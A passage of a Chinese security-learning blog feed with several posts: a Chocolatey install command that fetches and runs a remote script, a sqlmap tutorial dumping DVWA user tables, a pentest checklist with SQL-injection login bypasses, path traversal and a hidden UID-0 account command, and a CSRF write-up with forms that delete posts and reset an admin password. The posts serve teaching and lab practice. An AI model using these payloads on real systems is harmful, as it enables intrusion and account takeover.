    <published>2018-03-26T17:12:20.000Z</published>
    <updated>2018-03-26T09:30:36.031Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><a href="https://cmder.net/" target="_blank" rel="external">Cmder官网</a>（它把 conemu，msysgit 和 clink 打包在一起，让你无需配置就能使用一个真正干净的 Linux 终端！它甚至还附带了漂亮的 monokai 配色主题。）;作为一个压缩档的存在, 可即压即用。你甚至可以放到 USB 就可以虽时带着走，连调整过的设定都会放在这个目录下，不会用到系统机码(Registry)，所以也很适合放在 Dropbox / Google Drive / OneDrive 共享于多台电脑。</p>
<h3 id="修改-chocolatey-安装路径"><a href="#修改-chocolatey-安装路径" class="headerlink" title="修改 chocolatey 安装路径"></a>修改 chocolatey 安装路径</h3><p>最新版本的 chocolatey 的默认安装路径是：</p>
<p><code>C:\ProgramData\Chocolatey</code><br>如何修改为自己的路径呢？</p>
<p>在 系统环境变量 中增加 ChocolateyInstall：</p>
<p><code>d:\chocolatey</code></p>
<p>然后打开 cmd 窗口，执行如下命令：</p>
<p><code>@powershell -NoProfile -ExecutionPolicy unrestricted -Command &quot;(iex ((new-object net.webclient).DownloadString(&#39;https://chocolatey.org/install.ps1&#39;))) &gt;$null 2&gt;&amp;1&quot; &amp;&amp; SET PATH=%PATH%;%ALLUSERSPROFILE%\chocolatey\bin</code></p>
<p><a href="https://vxhly.github.io/2017/04/install-cmder-on-windows/" target="_blank" rel="external">在 windows 下安装 Cmder</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://cmder.net/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Cmder官网&lt;/a
    
    </summary>
    
      <category term="工具" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="工具" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Web安全|Sqlmap的使用入门</title>
    <link href="http://yoursite.com/2018/03/26/Web%E5%AE%89%E5%85%A8-Sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/"/>
    <id>http://yoursite.com/2018/03/26/Web安全-Sqlmap的使用入门/</id>
    <published>2018-03-26T11:19:43.000Z</published>
    <updated>2018-03-26T06:08:39.060Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>SQLmap 是一款用来检测与利用 SQL 注入漏洞的免费开源工具，有一个非常棒的特性，即对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行命令）</p>
<h3 id="SQLmap-环境"><a href="#SQLmap-环境" class="headerlink" title="SQLmap 环境"></a>SQLmap 环境</h3><ul>
<li>python 2.7.x</li>
<li>Sqlmap <a href="https://sqlmap.org/" target="_blank" rel="external">官网下载</a></li>
</ul>
<p>将 SQLmap 解压至 Python 目录下，将 SQLmap 的程序目录重命名为 sqlmap</p>
<ul>
<li>DVWA  <a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="external">Github 下载地址</a><br>DVWA(Dam Vulnerable Web Application) 使用 PHP+Mysql 编写的一套用于常规 WEB 漏洞教学和检测的 WEB 脆弱性测试程序。包含 SQL 注入、XSS、盲注等常见的一些漏洞。</li>
</ul>
<p>注:[在 Windows 下还需安装 PHP 环境，这里推介两个 PHP 集成环境 (Wamp、phpStudy)]</p>
<h3 id="SQlmap-使用方法"><a href="#SQlmap-使用方法" class="headerlink" title="SQlmap 使用方法"></a>SQlmap 使用方法</h3><p>本次实验的目的：使用 SQLmap 得到以下信息：</p>
<ul>
<li>枚举 MYSQL 用户名与密码。</li>
<li>枚举所有数据库。</li>
<li>枚举指定数据库的数据表。</li>
<li>枚举指定数据表中的所有用户名与密码。</li>
</ul>
<h4 id="查看帮助"><a href="#查看帮助" class="headerlink" title="查看帮助"></a>查看帮助</h4><p>Windows：查看 Python 帮助命令 <code>python sqlmap.py -h</code></p>
<p>选项解释</p>
<ul>
<li>–cookie =&gt; 设置我们的 cookie 值 “将 DVWA 安全等级设置为 low”</li>
<li>–data =&gt; 设置 POST 提交的值，如果是 GET 提交，不需要此选项</li>
<li>-u =&gt; 指定目标 URL</li>
<li>-b =&gt; 获取 DBMS banner</li>
<li>–current-db =&gt; 获取当前数据库</li>
<li>–current-user =&gt; 获取当前数据库的用户</li>
<li>–tables =&gt; 获取数据库里所有的表名</li>
<li>–columns =&gt; 获取表里的所有字段</li>
<li>–dump =&gt; 获取值</li>
<li>–current-user =&gt; 获取当前用户</li>
<li>-D =&gt; 爆库指定数据库名</li>
<li>-T =&gt; 爆库指定表名</li>
<li>-C =&gt; 爆库指定字段名</li>
<li>–string =&gt; 当查询可用时用来匹配页面中的字符串</li>
<li>–users =&gt; 枚举 DBMS 用户</li>
<li>–password =&gt; 枚举 DBMS 用户密码 hash</li>
<li>–dbs =&gt; 枚举 DBMS 中的数据库</li>
</ul>
<h4 id="开始爆库-DVWA-的难度为-low"><a href="#开始爆库-DVWA-的难度为-low" class="headerlink" title="开始爆库 [DVWA 的难度为 low]"></a>开始爆库 [DVWA 的难度为 low]</h4><h5 id="先获取-Cookie"><a href="#先获取-Cookie" class="headerlink" title="先获取 Cookie"></a>先获取 Cookie</h5><p>登录DVWA，开开发者工具，查看cookie,复制下来，看图：</p>
<p><img src="/images/sqlmap使用-01.png" alt="Sqlmap使用" title="sqlmap使用-01"></p>
<h5 id="获取数据库，–current-db"><a href="#获取数据库，–current-db" class="headerlink" title="获取数据库，–current-db"></a>获取数据库，–current-db</h5><p>for example<br><code>python sqlmap.py -u &quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=n9q4k788od014b1invk832qal0&quot; --current-db</code></p>
<blockquote>
<p>URL 地址和 Cookie 请用真实的替换掉。这条命令可以把当前所有的数据库获取出来的。注意 –current-db 的 - 可是有两个的。</p>
</blockquote>
<p><img src="/images/sqlmap使用-02.png" alt="获取数据库" title="sqlmap使用-02"></p>
<h5 id="获取表，–tables"><a href="#获取表，–tables" class="headerlink" title="获取表，–tables"></a>获取表，–tables</h5><blockquote>
<p>前面，我们已经获取到数据库名，这时候我们要指定数据库名。使用 -D 选项指定数据库名。注意 –tables 的 - 可是有两个的。</p>
</blockquote>
<p>For Example:<br><code>python sqlmap.py -u &quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=n9q4k788od014b1invk832qal0&quot;  -D &#39;dvwa&#39; --tables</code></p>
<p><img src="/images/sqlmap使用-03.png" alt="获取表" title="sqlmap使用-03"></p>
<h5 id="获取字段，–columns"><a href="#获取字段，–columns" class="headerlink" title="获取字段，–columns"></a>获取字段，–columns</h5><blockquote>
<p>前面，我们已经获取到数据库名和表名了，这时候我们要指定数据库名和表名。使用 -D 选项指定数据库名，使用 -T 指定表名。这里我们选择表 users。注意 –columns 的 - 可是有两个的。</p>
</blockquote>
<p>For Example:</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=n9q4k788od014b1invk832qal0&quot; -D &#39;dvwa&#39; -T &#39;users&#39; --columns</code></p>
<p><img src="/images/sqlmap使用-04.png" alt="获取字段" title="sqlmap使用-04"></p>
<h5 id="获取数据，–dump"><a href="#获取数据，–dump" class="headerlink" title="获取数据，–dump"></a>获取数据，–dump</h5><blockquote>
<p>前面，我们已经获取到数据库名、表名还有字段名了，这时候我们要指定数据库名、表名还有字段名。使用 -D 选项指定数据库名，使用 -T 指定表名，使用 -C 指定字段名。这里我们选择表 users中的字段 user_id。注意 –dump 的 - 可是有两个的。</p>
</blockquote>
<p>For Example:</p>
<p><code>python sqlmap.py -u &quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;security=low; PHPSESSID=n9q4k788od014b1invk832qal0&quot; -D &#39;dvwa&#39; -T &#39;users&#39; -C &#39;user_id&#39; --dump</code></p>
<p><img src="/images/sqlmap使用-05.png" alt="获取数据" title="sqlmap使用-05"></p>
<h3 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h3><p>这就是Sqlmap的简单使用了，希望对你们有帮助。</p>
<p><a href="https://vxhly.github.io/2016/09/usage-of-sqlmap/" target="_blank" rel="external">渗透工具用法（一）：SQLmap 的用法</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;SQLmap 是一款用来检测与利用 SQL 注入漏洞的免费开源工具，有一个非常棒的特性，即对检测与利用的自动化处理（数据库指纹、访问底层文件
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web安全" scheme="http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Web安全|渗透基础知识</title>
    <link href="http://yoursite.com/2018/03/26/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <id>http://yoursite.com/2018/03/26/Web安全-渗透基础知识/</id>
    <published>2018-03-26T10:39:00.000Z</published>
    <updated>2018-03-26T03:02:03.481Z</updated>
    
    <content type="html"><![CDATA[<p>自己在Web开发这条路上走了将近一年了，虽然能完成大部分的功能需求，但是代码质量堪忧，还是有一些安全漏洞，所以决定入坑Web安全，了解一波。</p>
<h3 id="HTML-表单基础"><a href="#HTML-表单基础" class="headerlink" title="HTML 表单基础"></a>HTML 表单基础</h3><ol>
<li>该表单是提交给哪个文件进行处理的（查看 action 属性值）</li>
<li>向后端程序提交的参数是什么（查看 name 属性）</li>
</ol>
<h3 id="SQL-数据库查询语句基础"><a href="#SQL-数据库查询语句基础" class="headerlink" title="SQL 数据库查询语句基础"></a>SQL 数据库查询语句基础</h3><ol>
<li>查询返回所有的结果</li>
</ol>
<p><code>select * from users;</code></p>
<ol>
<li>条件查询</li>
</ol>
<p><code>select * from users where uame=&#39;$uname&#39;</code>;</p>
<ol>
<li>union 合并多个查询结果</li>
</ol>
<p><code>select * from users union select * from msgs;</code></p>
<ol>
<li>… …</li>
</ol>
<h3 id="万能用户名或者万能密码"><a href="#万能用户名或者万能密码" class="headerlink" title="万能用户名或者万能密码"></a>万能用户名或者万能密码</h3><ul>
<li>第一种<br><code>select * from users where uame=&#39;&#39; or &#39;&#39;=&#39;&#39; and passwd=$passwd;</code></li>
<li>第二种<br><code>select _from users where uame=&#39;&#39; union select_ from users and passwd=$passwd;</code></li>
<li>第三种<br><code>select * from users where uame=$uname and passwd=&#39;&#39; or &#39;&#39;=&#39;&#39;;</code></li>
<li>… …</li>
</ul>
<h3 id="使用PDO进行防注入基础"><a href="#使用PDO进行防注入基础" class="headerlink" title="使用PDO进行防注入基础"></a>使用PDO进行防注入基础</h3><ol>
<li>允许长连接<br><code>PDO::ATTR_PERSISTENT=&gt;true</code></li>
<li>不允许使用预处理语句<br><code>PDO::ATTR_EMULATE_PREPARE=&gt;false</code></li>
<li>PDO 连接<br><code>$pdh=new PDO(host=&#39;127.0.0.1:1433&#39;,user=&#39;sa&#39;,password=&#39;root&#39;);</code></li>
<li>预处理 SQL 查询语句<br><code>$stmt=$dbh-&gt;prepare($sql)</code></li>
<li>填充 SQL 语句中的占位符<br><code>$stmt-&gt;execute(array(...,...,....));</code></li>
<li>SQL 占位符（如：select <em> from users where uname=? and passwd=?;）<br>`select </em> from users where uname=? and passwd=?;`</li>
<li>… …</li>
</ol>
<h3 id="Wireshark-抓包"><a href="#Wireshark-抓包" class="headerlink" title="Wireshark 抓包"></a>Wireshark 抓包</h3><ol>
<li>熟练使用 Wireshark 这款软件</li>
<li>熟练掌握过滤器的写法（如：tcp、udp、icmp、mac … …）</li>
<li>知道各个协议的包结构、包头、包尾</li>
<li>… …</li>
</ol>
<h3 id="审查代码的能力"><a href="#审查代码的能力" class="headerlink" title="审查代码的能力"></a>审查代码的能力</h3><ul>
<li>HTML 源文件内容（通过右键网页 –&gt; 查看源文件）</li>
<li>PHP 代码（了解代码逻辑以及书写规范，特别是对函数名的记忆）</li>
<li>PYTHON 代码（快速读懂代码意思，特别是要从 main 函数入手去查看）</li>
<li>C 语言代码（从代码中分析出来，该代码的意思以及各个函数的逻辑）</li>
<li>… …</li>
</ul>
<h3 id="各个-WEB-漏洞的利用能力"><a href="#各个-WEB-漏洞的利用能力" class="headerlink" title="各个 WEB 漏洞的利用能力"></a>各个 WEB 漏洞的利用能力</h3><ul>
<li>SQL 注入（通过万能用户名和万能密码来获取一定的 webshell）</li>
<li>命令注入（特别是PHP中的 exec 和 system 函数也能获取到一定的 webshell）</li>
<li>文件包含和目录遍历（通过 ../../../../… …/flag.txt 来获取文件）</li>
<li>… …</li>
</ul>
<h3 id="Liunx-服务的安全配置"><a href="#Liunx-服务的安全配置" class="headerlink" title="Liunx 服务的安全配置"></a>Liunx 服务的安全配置</h3><ul>
<li>SSH（禁止 root 登录；禁止空密码登录；禁止密钥登录 … …）</li>
<li>TELNET（禁止 root telnet；禁用 telnet … …）</li>
<li>VSFTP（不允许普通用户登录 ftp；禁止匿名用户登录 ftp … …）</li>
<li>HTTPD（禁止回显 banner 信息；严格控制目录权限 … …）</li>
<li>… …</li>
</ul>
<h3 id="PHP-安全配置"><a href="#PHP-安全配置" class="headerlink" title="PHP 安全配置"></a>PHP 安全配置</h3><ol>
<li>开启安全模式<br><code>safe_mode = on</code></li>
<li>禁用函数<br><code>disable_functions = system,exec,eval,shell_exec,phpinfo,... ...</code></li>
<li>禁止SQL注入<br><code>magic_quotes_gpc = On</code></li>
</ol>
<h3 id="PYTHON-渗透脚本基础"><a href="#PYTHON-渗透脚本基础" class="headerlink" title="PYTHON 渗透脚本基础"></a>PYTHON 渗透脚本基础</h3><ul>
<li>了解 scapy 这一模块（特别是在构造数据包的时候该怎么写）</li>
<li>了解 dpkt 封装或者拆解网络协议包</li>
<li>了解 socket 编程</li>
<li>能够从 help 这一帮助函数中获取到其他函数的使用方法</li>
<li>拥有快速阅读脚本的能力和代码逻辑思维</li>
<li>… …</li>
</ul>
<h3 id="Liunx-常用命令"><a href="#Liunx-常用命令" class="headerlink" title="Liunx 常用命令"></a>Liunx 常用命令</h3><ul>
<li>find<br><code>find  /  -iname  * | xargs  grep  –i  &#39;*key*&#39;</code></li>
<li>grep<br><code>grep  &#39;*key*&#39;  ./keystring.txt</code></li>
<li>netstat<br><code>netstat –tulnp 11.4 kill -9 [pid] 11.5 chattr +i /etc/passwd</code></li>
<li>kill<br><code>kill -9 [pid]</code></li>
<li>chattr<br><code>chattr  +i  /etc/passwd /etc/shadow</code></li>
<li>useradd<br><code>useradd  -o  -u  0  test</code></li>
</ul>
<h3 id="WEB-漏洞训练平台"><a href="#WEB-漏洞训练平台" class="headerlink" title="WEB 漏洞训练平台"></a>WEB 漏洞训练平台</h3><ul>
<li>DVWA <a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="external">【DVWA】</a></li>
<li>Web For Pentester <a href="https://pentesterlab.com/exercises/web_for_pentester_II" target="_blank" rel="external">【Web For Pentester II】</a>(请自行安装镜像，安装时请选择”其他 Liunx 3.x 内核 64 位”)</li>
<li>ZVulDrill <a href="https://github.com/710leo/ZVulDrill" target="_blank" rel="external">【ZVulDrill】</a>(请自行准备 PHP 环境)</li>
<li>… …</li>
</ul>
<h3 id="网络协议原理"><a href="#网络协议原理" class="headerlink" title="网络协议原理"></a>网络协议原理</h3><ul>
<li>Tcp 三次握手和四次挥手</li>
<li>Icmp 发包以及回包</li>
<li>Mac 防洪原理</li>
<li>ARP 发广播包，ARP 欺骗</li>
<li>Dtp 生成树攻击原理</li>
<li>… …</li>
</ul>
<h3 id="关于-PYTHON-的网络渗透编程"><a href="#关于-PYTHON-的网络渗透编程" class="headerlink" title="关于 PYTHON 的网络渗透编程"></a>关于 PYTHON 的网络渗透编程</h3><ul>
<li><p>ARP 扫描</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">import socket</div><div class="line"># or</div><div class="line">from scapy.all import *</div></pre></td></tr></table></figure>
</li>
<li><p>ARP 欺骗、ARP 监控<br><code>from scapy.all import *</code></p>
</li>
<li>OS 扫描<br><code>import nmap</code></li>
<li><p>Mac 防洪</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">import socket</div><div class="line"># or</div><div class="line">from scapy.all import *</div></pre></td></tr></table></figure>
</li>
<li><p>mssql 数据库密码爆破<br><code>import pymssql</code></p>
</li>
<li>跨越 VlAN 攻击<br><code>from scapy.all import *</code></li>
<li>Dtp 攻击<br><code>from scapy.all import *</code></li>
<li>… …<br><a href="https://vxhly.github.io/2017/09/pentest-basic-knowledge/" target="_blank" rel="external">渗透基础知识</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;自己在Web开发这条路上走了将近一年了，虽然能完成大部分的功能需求，但是代码质量堪忧，还是有一些安全漏洞，所以决定入坑Web安全，了解一波。&lt;/p&gt;
&lt;h3 id=&quot;HTML-表单基础&quot;&gt;&lt;a href=&quot;#HTML-表单基础&quot; class=&quot;headerlink&quot; tit
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web安全" scheme="http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Web安全|一些有用的工具</title>
    <link href="http://yoursite.com/2018/03/26/Web%E5%AE%89%E5%85%A8-%E4%B8%80%E4%BA%9B%E6%9C%89%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7/"/>
    <id>http://yoursite.com/2018/03/26/Web安全-一些有用的工具/</id>
    <published>2018-03-25T23:44:58.000Z</published>
    <updated>2018-03-26T03:20:21.818Z</updated>
    
    <content type="html"><![CDATA[<h3 id="安利一些工具"><a href="#安利一些工具" class="headerlink" title="安利一些工具"></a>安利一些工具</h3><p>Sqlmap </p>
<p><a href="https://vxhly.github.io/2016/09/usage-of-sqlmap/" target="_blank" rel="external">SQLmap 的用法</a></p>
<p>DVWA<br><a href="https://github.com/ethicalhack3r/DVWA" target="_blank" rel="external">下载安装</a><br><a href="http://www.cnblogs.com/lsdb/p/6826519.html" target="_blank" rel="external">使用教程</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;安利一些工具&quot;&gt;&lt;a href=&quot;#安利一些工具&quot; class=&quot;headerlink&quot; title=&quot;安利一些工具&quot;&gt;&lt;/a&gt;安利一些工具&lt;/h3&gt;&lt;p&gt;Sqlmap &lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://vxhly.github.io/2016/0
    
    </summary>
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Web安全" scheme="http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>PHP|PHP漏洞全解-跨网站请求伪造</title>
    <link href="http://yoursite.com/2018/03/25/PHP-PHP%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3-%E8%B7%A8%E7%BD%91%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
    <id>http://yoursite.com/2018/03/25/PHP-PHP漏洞全解-跨网站请求伪造/</id>
    <published>2018-03-24T18:30:47.000Z</published>
    <updated>2018-03-24T10:43:45.352Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>CSRF(Cross Site Request Forgeries)，意为跨网站请求伪造，也有写为XSRF。攻击者伪造目标用户的HTTP请求，然后此请求发送到有CSRF漏洞的网站，网站执行此请求后，引发跨站请求伪造攻击。攻击者利用隐蔽的HTTP连接，让目标用户在不注意的情况下单击这个链接，由于是用户自己点击的，而他又是合法用户拥有合法权限，所以目标用户能够在网站内执行特定的HTTP链接，从而达到攻击者的目的。</p>
<h3 id="漏洞案例"><a href="#漏洞案例" class="headerlink" title="漏洞案例"></a>漏洞案例</h3><p>随缘网络PHP留言板V1.0</p>
<h4 id="任意删除留言"><a href="#任意删除留言" class="headerlink" title="任意删除留言"></a>任意删除留言</h4><pre><code>include_once(&quot;dlyz.php&quot;); //dlyz.php用户验证权限，当权限是admin的时候方可删除留言 
include_once(&quot;../conn.php&quot;); 
$del=$_GET[&quot;del&quot;]; 
$id=$_GET[&quot;id&quot;]; 
if ($del==&quot;data&quot;) { 
    $ID_Dele= implode(&quot;,&quot;,$_POST[&apos;adid&apos;]); 
    $sql=&quot;delete from book where id in (&quot;.$ID_Dele.&quot;)&quot;; 
    mysql_query($sql); 
} 
else { 
    $sql=&quot;delete from book where id=&quot;.$id; //传递要删除的留言ID 
    mysql_query($sql); 
} 
mysql_close($conn); 
echo &quot;&quot;; 
echo &quot;alert(‘删除成功！’);&quot;; 
echo &quot; location=’book.php’;&quot;; 
echo &quot;&quot;; 
?&gt; 
</code></pre><p>当我们具有admin权限，提交<a href="http://localhost/manage/delbook.php?id=2" target="_blank" rel="external">http://localhost/manage/delbook.php?id=2</a> 时，就会删除id为2的留言。</p>
<p>利用方法:</p>
<p>我们使用普通用户留言（源代码方式），内容为。</p>
<pre><code>&quot;delbook.php?id=2&quot; /&gt; 
&quot;delbook.php?id=3&quot; /&gt; 
&quot;delbook.php?id=4&quot; /&gt; 
&quot;delbook.php?id=5&quot; /&gt; 
</code></pre><p>插入4张图片链接分别删除4个id留言，然后我们返回首页浏览看，没有什么变化。。(图片显示不了)</p>
<p>现在我们再用管理员账号登陆后，来刷新首页，会发现留言就剩一条，其他在图片链接中指定的ID号的留言，全部都被删除。</p>
<p>攻击者在留言中插入隐藏的图片链接，此链接具有删除留言的作用，而攻击者自己访问这些图片链接的时候，是不具有权限的，所以看不到任何效果，但是当管理员登陆后，查看此留言，就会执行隐藏的链接，而他的权限又是足够大的，从而这些留言就被删除了.</p>
<h4 id="修改管理员密码"><a href="#修改管理员密码" class="headerlink" title="修改管理员密码"></a>修改管理员密码</h4><pre><code>//pass.php 
if($_GET[&quot;act&quot;]) { 
    $username=$_POST[&quot;username&quot;]; 
    $sh=$_POST[&quot;sh&quot;]; 
    $gg=$_POST[&quot;gg&quot;]; 
    $title=$_POST[&quot;title&quot;]; 
    $copyright=$_POST[&quot;copyright&quot;];
    $password=md5($_POST[&quot;password&quot;]); 
if(emptyempty($_POST[&quot;password&quot;])) { 
    $sql=&quot;update gly set username=’&quot;.$username.&quot;’,sh=&quot;.$sh.&quot;,gg=’&quot;.$gg.&quot;’,title=’&quot;.$title.&quot;’,copyright=’&quot;.$copyright.&quot;’ where id=1&quot;; 
} 
else { 
    $sql=&quot;update gly set username=’&quot;.$username.&quot;’,password=’&quot;.$password.&quot;’,sh=&quot;.$sh.&quot;,gg=’&quot;.$gg.&quot;’,title=’&quot;.$title.&quot;’,copyright=’&quot;.$copyright.&quot;’ where id=1&quot;; 
} 
mysql_query($sql); 
mysql_close($conn); 
echo &quot;&quot;; 
echo &quot;alert(‘修改成功！’);&quot;; 
echo &quot; location=’pass.php’;&quot;; 
echo &quot;&quot;; 
} 
</code></pre><p>这个文件用于修改管理密码和网站设置的一些信息，我们可以直接构造如下表单:</p>
<pre><code>&lt;body&gt; 
    &lt;form action=&quot;http://localhost/manage/pass.php?act=xg&quot; method=&quot;post&quot; name=&quot;form1&quot; id=&quot;form1&quot;&gt; 
    &lt;input type=&quot;radio&quot; value=&quot;1&quot; name=&quot;sh&quot;&gt; 
    &lt;input type=&quot;radio&quot; name=&quot;sh&quot; checked value=&quot;0&quot;&gt; 
    &lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;root&quot;&gt; 
    &lt;input type=&quot;password&quot; name=&quot;password&quot; value=&quot;root&quot;&gt; 
    &lt;input type=&quot;text&quot; name=&quot;title&quot; value=&quot;随缘网络PHP留言板V1.0(带审核功能)&quot; &gt; 
    &lt;textarea name=&quot;gg&quot; rows=&quot;6&quot; cols=&quot;80&quot; &gt;欢迎您安装使用随缘网络PHP留言板V1.0(带审核功能)！textarea&gt; 
    &lt;textarea name=&quot;copyright&quot; rows=&quot;6&quot; cols=&quot;80&quot; &gt;随缘网络PHP留言本V1.0 版权所有：厦门随缘网络科技 2005-2009&lt;br/&gt;承接网站建设及系统定制 提供优惠主机域名textarea&gt; 
    form&gt; 
&lt;body&gt; 
</code></pre><p>存为attack.html，放到自己网站上<a href="http://www.wduozhi.xyz/attack.html，此页面访问后会自动向目标程序的pass.php提交参数，用户名修改为root，密码修改为root，然后我们去留言板发一条留言，隐藏这个链接，管理访问以后，他的用户名和密码全部修改成了root" target="_blank" rel="external">http://www.wduozhi.xyz/attack.html，此页面访问后会自动向目标程序的pass.php提交参数，用户名修改为root，密码修改为root，然后我们去留言板发一条留言，隐藏这个链接，管理访问以后，他的用户名和密码全部修改成了root</a></p>
<h3 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h3><p>防范CSRF要比防范其他攻击更加困难，因为CSRF的HTTP请求虽然是攻击者伪造的，但是却是由目标用户发出的，一般常见的防范方法有下面几种:</p>
<ol>
<li>检查网页的来源</li>
<li>检查内置的隐藏变量</li>
<li>使用POST，不要使用GET</li>
</ol>
<h4 id="检查网页来源"><a href="#检查网页来源" class="headerlink" title="检查网页来源"></a>检查网页来源</h4><p>在//pass.php头部加入以下红色字体代码，验证数据提交</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line">if($_GET[&quot;act&quot;]) </div><div class="line">&#123; </div><div class="line">    if(isset($_SERVER[&quot;HTTP_REFERER&quot;])) </div><div class="line">    &#123; </div><div class="line">        $serverhost = $_SERVER[&quot;SERVER_NAME&quot;]; </div><div class="line">        $strurl = str_replace(&quot;http://&quot;,&quot;&quot;,$_SERVER[&quot;HTTP_REFERER&quot;]); </div><div class="line">        $strdomain = explode(&quot;/&quot;,$strurl); </div><div class="line">        $sourcehost = $strdomain[0]; </div><div class="line">    if(strncmp($sourcehost, $serverhost, strlen($serverhost))) </div><div class="line">    &#123;</div><div class="line">        unset($_POST); </div><div class="line">        echo &quot;&quot;; </div><div class="line">        echo &quot;alert(‘数据来源异常!’);&quot;; </div><div class="line">        echo &quot; location=’index.php’;&quot;;</div><div class="line">        echo &quot;&quot;; </div><div class="line">     &#125; </div><div class="line">     &#125; </div><div class="line">    $username=$_POST[&quot;username&quot;]; </div><div class="line">    $sh=$_POST[&quot;sh&quot;]; </div><div class="line">    $gg=$_POST[&quot;gg&quot;]; </div><div class="line">    $title=$_POST[&quot;title&quot;]; </div><div class="line">    $copyright=$_POST[&quot;copyright&quot;].&quot;</div><div class="line">设计制作：厦门随缘网络科技&quot;; </div><div class="line">    $password=md5($_POST[&quot;password&quot;]); </div><div class="line">    if(emptyempty($_POST[&quot;password&quot;])) </div><div class="line">    &#123; </div><div class="line">        $sql=&quot;update gly set username=’&quot;.$username.&quot;’,sh=&quot;.$sh.&quot;,gg=’&quot;.$gg.&quot;’,title=’&quot;.$title.&quot;’,copyright=’&quot;.$copyright.&quot;’ where id=1&quot;; </div><div class="line">    &#125; </div><div class="line">    else </div><div class="line">    &#123; </div><div class="line">        $sql=&quot;update gly set username=’&quot;.$username.&quot;’,password=’&quot;.$password.&quot;’,sh=&quot;.$sh.&quot;,gg=’&quot;.$gg.&quot;’,title=’&quot;.$title.&quot;’,copyright=’&quot;.$copyright.&quot;’ where id=1&quot;; </div><div class="line">    &#125; </div><div class="line">mysql_query($sql); </div><div class="line">mysql_close($conn); </div><div class="line">echo &quot;&quot;; </div><div class="line">echo &quot;alert(‘修改成功！’);&quot;; </div><div class="line">echo &quot; location=’pass.php’;&quot;; </div><div class="line">echo &quot;&quot;; </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h4 id="检查内置隐藏变量"><a href="#检查内置隐藏变量" class="headerlink" title="检查内置隐藏变量"></a>检查内置隐藏变量</h4><p>我们在表单中内置一个隐藏变量和一个session变量，然后检查这个隐藏变量和session变量是否相等，以此来判断是否同一个网页所调用</p>
